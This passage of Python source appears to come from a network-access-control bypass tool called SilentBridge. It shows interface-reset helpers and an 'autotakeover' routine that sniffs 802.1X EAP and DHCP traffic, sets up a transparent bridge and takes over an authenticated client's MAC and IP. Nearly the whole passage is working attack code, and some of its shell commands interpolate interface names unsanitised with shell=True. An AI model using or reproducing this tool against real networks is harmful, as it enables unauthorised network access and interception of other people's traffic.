    def handle_networkmanager_interface(self, interface, action='unmanage'):
        """Handle NetworkManager interface management
        action: 'unmanage' or 'manage'
        """
        if not self.network_stack['networkmanager']:
            return False
            
        try:
            if action == 'unmanage':
                # First check if interface is managed by NetworkManager using shell=True
                result = self.run_command(f"nmcli device status | grep {interface}", shell=True)
                if not result or 'unmanaged' in result:
                    return True
                    
                print(f"[*] Removing {interface} from NetworkManager control...")
                self.run_command(f"nmcli device set {interface} managed no")
                
                # Wait for NetworkManager to release the interface
                time.sleep(2)
                return True
                
            elif action == 'manage':
                print(f"[*] Returning {interface} to NetworkManager control...")
                self.run_command(f"nmcli device set {interface} managed yes")
                return True
                
        except Exception as e:
            print(f"[!] Error handling NetworkManager for {interface}: {e}")
            return False

    def reset_interface(self, interface):
        """Reset an interface to a clean state"""
        try:
            # Remove from NetworkManager if present first
            if self.network_stack['networkmanager']:
                self.handle_networkmanager_interface(interface, 'unmanage')
            
            # Bring interface down
            if self.network_stack['ip']:
                self.run_command(f"ip link set {interface} down", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {interface} down", ignore_errors=True)
            
            # Flush IP addresses
            if self.network_stack['ip']:
                self.run_command(f"ip addr flush dev {interface}", ignore_errors=True)
            
            # Reset interface flags
            self.run_command(f"ip link set {interface} promisc off", ignore_errors=True)
            
            # Bring interface back up for packet capture
            if self.network_stack['ip']:
                self.run_command(f"ip link set {interface} up", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {interface} up", ignore_errors=True)
            
            # Small delay to ensure interface is up
            time.sleep(1)
            
            return True
        except Exception as e:
            print(f"[!] Error resetting interface {interface}: {e}")
            return False

    def cleanup_autotakeover(self):
        """Clean up after failed autotakeover"""
        print("[*] Cleaning up...")
        
        # Destroy bridge if it exists
        if self.check_interface_exists(self.args.bridge):
            self.destroy_bridge()
        
        # Reset interfaces
        for iface in self.args.interfaces:
            self.reset_interface(iface)
            if self.network_stack['networkmanager']:
                self.handle_networkmanager_interface(iface, 'manage')
                self.run_command(f"nmcli device connect {iface}", ignore_errors=True)
            else:
                if self.network_stack['ip']:
                    self.run_command(f"ip link set {iface} up", ignore_errors=True)
                else:
                    self.run_command(f"ifconfig {iface} up", ignore_errors=True)

    def autotakeover(self):
        """Automatically analyze, bridge and takeover client connection"""
        print("[*] Starting autotakeover operation...")
        success = False
        
        try:
            # Check if interfaces exist
            for iface in self.args.interfaces:
                if not self.check_interface_exists(iface):
                    print(f"[!] Interface {iface} does not exist!")
                    return
            
            # Step 1: Reset interfaces to clean state
            print("[*] Resetting interfaces to clean state...")
            for iface in self.args.interfaces:
                if not self.reset_interface(iface):
                    raise Exception(f"Failed to reset interface {iface}")
            
            print("[*] Waiting 5 seconds for interfaces to settle...")
            time.sleep(5)  # Reduced from 10 to 5 since we're already waiting in reset_interface
            
            # Verify interfaces are up before starting capture
            for iface in self.args.interfaces:
                if self.network_stack['ip']:
                    state = self.run_command(f"ip link show {iface}", shell=True)
                    if state and "DOWN" in state:
                        print(f"[*] Bringing up {iface}...")
                        self.run_command(f"ip link set {iface} up", ignore_errors=True)
                        time.sleep(1)
                else:
                    self.run_command(f"ifconfig {iface} up", ignore_errors=True)
                    time.sleep(1)
            
            # Step 2: Analyze network to determine interfaces
            print("[*] Starting network analysis...")
            # Create temporary args for analysis
            original_args = self.args
            analysis_args = argparse.Namespace(
                interfaces=self.args.interfaces,
                timeout=self.args.timeout,
                sidechannel=self.args.sidechannel
            )
            self.args = analysis_args
            
            # Clear any existing packets
            while not self.packet_queue.empty():
                self.packet_queue.get()
            
            self.stop_sniffing.clear()
            
            # Start packet capture with error handling
            threads = []
            for iface in self.args.interfaces:
                def sniff_with_retry(iface):
                    while not self.stop_sniffing.is_set():
                        try:
                            sniff(iface=iface,
                                 prn=self.packet_callback,
                                 store=0,
                                 stop_filter=lambda _: self.stop_sniffing.is_set())
                        except OSError as e:
                            if e.errno == 100:  # Network is down
                                print(f"[!] Interface {iface} is down, retrying...")
                                time.sleep(1)
                                continue
                            raise
                
                thread = Thread(target=sniff_with_retry, args=(iface,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            print("[*] Listening for EAP and DHCP packets...")
            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
            print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
            
            # Analyze packets
            config = self.analyze_packets(self.args.timeout)
            
            # Stop packet capture
            self.stop_sniffing.set()
            for thread in threads:
                thread.join()
            
            # Restore original args
            self.args = original_args
            
            if not config['phy_interface'] or not config['upstream_interface']:
                raise Exception("Could not determine interface roles")
            
            # Step 3: Create bridge with analyzed interfaces
            print("[*] Creating bridge with detected configuration...")
            bridge_args = argparse.Namespace(
                bridge=self.args.bridge,
                phy=config['phy_interface'],
                upstream=config['upstream_interface'],
                sidechannel=self.args.sidechannel,
                egress_port=22,
                use_legacy=False
            )
            self.args = bridge_args
            self.create_transparent_bridge()
            
            # Step 4: Wait for client authentication and DHCP
            print("[*] Waiting for client authentication and DHCP...")
            time.sleep(5)  # Give the bridge time to stabilize
            
            # Update config with client information
            self.args = analysis_args
            self.stop_sniffing.clear()
            
            # Start new packet capture for client info
            threads = []
            for iface in [config['phy_interface'], config['upstream_interface']]:
                thread = Thread(target=lambda: sniff(
                    iface=iface,
                    prn=self.packet_callback,
                    store=0,
                    stop_filter=lambda _: self.stop_sniffing.is_set()
                ))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Analyze packets for client information
            client_config = self.analyze_packets(self.args.timeout)
            
            # Stop packet capture
            self.stop_sniffing.set()
            for thread in threads:
                thread.join()
            
            if not client_config['client_mac'] or not client_config['client_ip']:
                raise Exception("Could not obtain client information")
            
            # Step 5: Perform takeover
            print("[*] Initiating takeover with obtained configuration...")
            takeover_args = argparse.Namespace(
                bridge=self.args.bridge,
                phy=config['phy_interface'],
                veth_name=self.args.veth_name,
                client_mac=client_config['client_mac'],
                client_ip=client_config['client_ip'],
                netmask='255.255.255.0',  # Default netmask
                gateway_ip=client_config['router_ip'] if client_config['router_ip'] else None
            )
            
            if not takeover_args.gateway_ip:
                # Try to determine gateway from client IP
                ip_parts = client_config['client_ip'].split('.')
                ip_parts[3] = '1'
                takeover_args.gateway_ip = '.'.join(ip_parts)
            
            self.args = takeover_args
            self.takeover_client()
            
            success = True
            print("[+] Autotakeover completed successfully!")
            
        except Exception as e:
            print(f"[!] Error during autotakeover: {e}")
            if not success:
                self.cleanup_autotakeover()
                print("[*] System restored to original state")
        
        finally:
            # Restore original args
            self.args = original_args

if __name__ == "__main__":
    bridge = SilentBridge()
    bridge.run() 